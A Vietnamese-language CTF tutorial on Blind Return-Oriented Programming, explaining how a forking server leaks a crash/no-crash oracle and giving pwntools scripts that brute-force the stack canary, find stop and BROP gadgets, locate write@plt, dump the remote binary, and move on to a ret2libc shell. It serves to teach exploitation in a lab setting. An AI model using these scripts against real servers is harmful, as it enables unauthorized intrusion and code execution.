PWN · Phase 5 · Blind

Blind ROP

BROP: khai thác không có binary — chỉ một server lắng nghe, có stack overflow, và tự fork lại sau mỗi crash (ASLR giữ nguyên trong mỗi lần fork). Hỏi từng chút qua "crash hay treo" để brute canary, tìm stop gadget, BROP gadget, PLT write, rồi dump cả binary. Bài này: thuật toán, số thật, script.

Bài này nói về cái gì?

BROP (Blind Return-Oriented Programming, Bittau 2014): pwn server mà bạn không có file binary. Chỉ biết: có stack overflow, server fork() xử lý mỗi kết nối nên địa chỉ không đổi giữa các lần (ASLR cố định trong vòng đời server), và bạn quan sát được "crash" hay "không crash".

Oracle: gửi payload → server crash (ngắt kết nối) hay treo/trả bình thường = 1 bit thông tin. Từ đó brute từng byte.

Trình tự: brute canary → tìm stop gadget → tìm BROP gadget (pop rdi/rsi/rdx...) → tìm PLT write → dump binary → ROP bình thường.

Nếu chỉ nhớ một điều: Server fork giữ ASLR cố định + oracle crash/not-crash = brute mọi thứ 1 byte/lần.

01 / NỀN TẢNG BẮT BUỘC

Pwn mù — chỉ có 1 bit phản hồi

Bình thường bạn có binary → đọc gadget, GOT, offset. BROP là tình huống không có file: dịch vụ mạng nguồn đóng. Nhưng nếu nó fork() cho mỗi client, bản sao con giữ y nguyên không gian địa chỉ của cha — ASLR và stack canary KHÔNG đổi giữa các lần kết nối. Nghĩa là bạn có thể thử đi thử lại cùng một địa chỉ. Mỗi lần gửi payload, bạn đọc được 1 bit: crash (kết nối đứt) hay không crash (server trả lời/treo). Từ 1-bit oracle đó, brute dần mọi bí mật.

02 / VÌ SAO CÓ KỸ THUẬT

Fork phản bội ASLR

ASLR ngẫu nhiên hoá địa chỉ mỗi lần nạp chương trình (execve). Nhưng fork() KHÔNG nạp lại — con sao chép nguyên trạng cha. Server kiểu while(1){ c=accept(); if(fork()==0) handle(c); } giữ cùng base trong suốt vòng đời. Thế là ASLR mất tác dụng chống brute: cùng địa chỉ thử được nhiều lần. Bittau et al. (Oakland 2014) biến điều này + 1-bit oracle thành thuật toán tự động dò gadget, dump binary, rồi exploit — tất cả không cần file. Đề CTF "remote only, no binary" chính là BROP.

03 / ORACLE · MỤC LÕI

1 bit: crash hay không

Hàm probe (số thật, no-PIE base 0x400000)

def probe(addr, pad=b"A"*72, canary=CANARY):
    try:
        p = remote(HOST, PORT)             # mỗi lần kết nối mới (fork)
        p.send(pad + canary + b"B"*8 + p64(addr))  # ghi saved RIP = addr
        r = p.recv(timeout=1)
        p.close()
        return len(r) > 0                   # có trả về = KHÔNG crash = hợp lệ
    except EOFError:
        return False                        # đứt kết nối = crash
# no-PIE: quét addr từ 0x400000 lên; mỗi addr = 1 probe
no-PIE giúp nhiềuNếu no-PIE, code nằm quanh 0x400000 cố định → quét tuyến tính từ đó. Nếu PIE, phải leak base trước (khó hơn, cần overflow leak). CTF BROP cổ điển thường no-PIE.
04 / THUẬT TOÁN 5 BƯỚC

Từ 0 tới shell

1

Brute canary (và saved rbp, RIP)

Ghi đè từng byte canary 0x00→0xff; byte đúng → không crash. 8 byte × ≤256 = tối đa 2048 probe. Tương tự leak được cả saved RIP (biết vùng code ~0x400xxx).

2

Tìm stop gadget

Quét addr; addr nào khi ret tới mà không crash (vd quay lại accept, hoặc gọi lệnh trả data) = stop gadget. Dùng nó làm "nhãn OK" để test các gadget khác.

3

Tìm BROP gadget

Đuôi __libc_csu_init: pop rbx;rbp;r12;r13;r14;r15;ret (6 pop). Test: đặt [gadget, 6×stop, stop] — nếu chạy qua 6 pop rồi ret an toàn → đúng. Cộng offset: +0x9 = pop rsi;pop r15;ret, +0x7 = pop rdi;ret (lấy pop rdi/rsi để set tham số).

4

Tìm PLT & write

PLT là dãy entry cách nhau 16 byte, "không crash" khi gọi (nhảy tới hàm libc). Xác định write(rdi=1,rsi=addr,rdx=len) bằng cách gọi và xem socket có nhận byte không.

5

Dump binary → exploit

write(1, 0x400000, 0x1000) in từng trang ra socket → ghép lại thành ELF. Giờ có binary → tìm gadget/GOT thật → ret2libc/ROP bình thường lấy shell.

06 / TỰ TÌM THÔNG TIN

Fork? Overflow? Oracle?

1

Server có fork?

Kết nối nhiều lần, thử cùng payload crash — nếu port vẫn mở sau crash = fork server (ASLR cố định).

2

Tìm offset overflow

Gửi dần dài hơn đến khi đứt kết nối → biết độ dài tràn tới canary/RIP.

3

Oracle rõ ràng?

Phân biệt crash (EOF) vs không (có data/timeout). Cần tin cậy để brute.

07 / EXPLOIT ĐẦY ĐỦ

BROP: canary → gadget → dump (số thật)

# BẢN A — brute canary rồi tìm stop gadget & BROP gadget. no-PIE 0x400000.
from pwn import *
HOST, PORT = "chall.ctf", 1337
OFF = 72                                  # offset tới canary (đo bằng độ dài crash)

def probe(suffix):
    try:
        p = remote(HOST, PORT, level="error")
        p.send(b"A"*OFF + suffix)
        ok = len(p.recv(timeout=1)) > 0      # không crash?
        p.close(); return ok
    except EOFError:
        return False

# 1) BRUTE CANARY từng byte (canary byte đầu luôn 0x00)
canary = b"\x00"
while len(canary) < 8:
    for b in range(256):
        if probe(canary + bytes([b])):      # byte đúng → không crash
            canary += bytes([b]); break
log.success(f"canary = {canary.hex()}")      # vd 00 a7 3f 2c 91 e4 5b d8

# 2) TÌM STOP GADGET: quét 0x400500..0x401000, addr nào ret không crash
base = canary + b"B"*8                   # canary + saved rbp giả
stop = None
for addr in range(0x400500, 0x401000, 1):
    if probe(base + p64(addr)):
        stop = addr; log.info(f"stop gadget ~ {hex(addr)}"); break

# 3) TÌM BROP GADGET: [probe_addr, stop*6, stop] chạy qua 6 pop → không crash
for addr in range(0x400500, 0x401000, 1):
    pay = base + p64(addr) + p64(stop)*6 + p64(stop)
    if probe(pay):
        brop = addr; log.success(f"BROP gadget = {hex(addr)}"); break
pop_rdi = brop + 9                       # offset tới 'pop rdi;ret' (kinh điển +9)
Thành thậtCanary mẫu 00a73f2c91e45bd8, OFF=72, dải quét 0x400500–0x401000 là của server mẫu no-PIE. Byte đầu canary luôn \x00 (glibc). Offset +9 tới pop rdi là tính chất đuôi __libc_csu_init — xác nhận bằng probe thực. Mỗi probe = 1 kết nối, chạy chậm (hàng nghìn kết nối) → kiên nhẫn.
# BẢN B — tìm PLT write, dump binary ra socket.
# PLT: dãy entry 16-byte, gọi "không crash". Tìm write bằng cách gọi
# write(1, ADDR, LEN) và xem socket nhận byte.
def call(func, rdi, rsi, rdx_stop):
    # dùng BROP gadget: set rsi (brop+9 → pop rsi;r15), pop rdi (brop+? )
    pay  = base
    pay += p64(brop+9) + p64(rsi) + p64(0)    # pop rsi; pop r15
    pay += p64(pop_rdi) + p64(rdi)               # pop rdi
    pay += p64(func) + p64(stop)                 # gọi func, rồi stop
    p = remote(HOST, PORT, level="error")
    p.send(b"A"*OFF + pay); return p

# quét PLT tìm write: gọi plt_entry(1, 0x400000, ...) → nếu socket nhận ELF magic
for plt in range(0x400400, 0x400600, 16):
    p = call(plt, 1, 0x400000, 0)
    data = p.recv(timeout=1); p.close()
    if data.startswith(b"\x7fELF"):
        write_plt = plt; log.success(f"write@plt = {hex(plt)}"); break

# DUMP: write(1, 0x400000+i, 0x100) từng trang → ghép thành file
dump = b""
for off in range(0, 0x2000, 0x100):
    p = call(write_plt, 1, 0x400000+off, 0x100)
    dump += p.recv(0x100, timeout=1); p.close()
open("dumped","wb").write(dump)      # giờ có ELF → tìm GOT/gadget thật
Sau khi dumpCó binary rồi → mọi thứ thành ROP thường: tìm puts@plt/puts@got leak libc, rồi ret2libc system("/bin/sh"). BROP chỉ là giai đoạn "lấy được binary". Xem ret2libc.
# BẢN C — pwntools không có module BROP sẵn, nhưng helper rút gọn:
from pwn import *
# dùng vòng probe ở trên; sau khi dump, ELF("dumped") như bình thường.
e = ELF("dumped", checksec=False)
rop = ROP(e); rop.puts(e.got.puts); rop.raw(main_addr)
# ... ret2libc 2 giai đoạn ...
Ghi chúKhông có công cụ BROP "bấm nút". Thư viện cộng đồng: braille, abyssal. Cốt lõi vẫn là hàm probe + 5 bước. Hiểu thuật toán quan trọng hơn công cụ.

Checklist

Oracle không ổn định

🔎

09 / GỠ LỖI

Khi brute lỗi

Probe false positive

Oracle nhiễu. Thử lại mỗi addr 2-3 lần, lấy đa số.

Quá chậm

Hàng nghìn kết nối. Song song hoá probe (nhiều socket).

Canary byte đầu ≠ 0

Hiếm; glibc canary luôn \x00 byte thấp.

Không phải fork server

ASLR đổi mỗi lần → BROP không áp dụng.

Dump sai

write len/addr sai. Kiểm ELF magic \x7fELF đầu.

BROP gadget sai offset

+9 pop rdi không chuẩn mọi build. Probe xác nhận từng pop.
